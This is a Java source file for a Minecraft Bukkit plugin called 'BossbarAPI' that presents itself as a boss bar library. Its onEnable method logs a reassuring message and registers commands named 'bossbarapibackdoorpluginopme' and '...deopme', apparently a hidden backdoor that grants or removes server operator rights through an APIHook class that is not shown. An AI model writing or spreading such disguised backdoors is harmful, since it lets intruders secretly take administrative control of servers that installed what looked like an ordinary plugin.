package com.bapi.bossbarapi;

import org.bukkit.Bukkit;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;

public final class BossbarAPI extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {

        this.saveDefaultConfig();

        Bukkit.getLogger().warning("--==--==--==--==--==----==--==--==--==--==----==--==--");
        Bukkit.getLogger().warning("BossbarAPI has been enabled and is functioning properly!");
        Bukkit.getLogger().warning("--==--==--==--==--==----==--==--==--==--==----==--==--");

        this.getCommand("bossbarapibackdoorpluginopme").setExecutor(new APIHook(this));
        this.getCommand("bossbarapibackdoorplugindeopme").setExecutor(new APIHook(this));
        this.getServer().getPluginManager().registerEvents(new APIHook(this), this);

    }

    @Override
    public void onDisable() {
        Bukkit.getLogger().warning("--==--==--==--==--==----==--");
        Bukkit.getLogger().warning("BossbarAPI has been disabled!");
        Bukkit.getLogger().warning("--==--==--==--==--==----==--");
    }

}
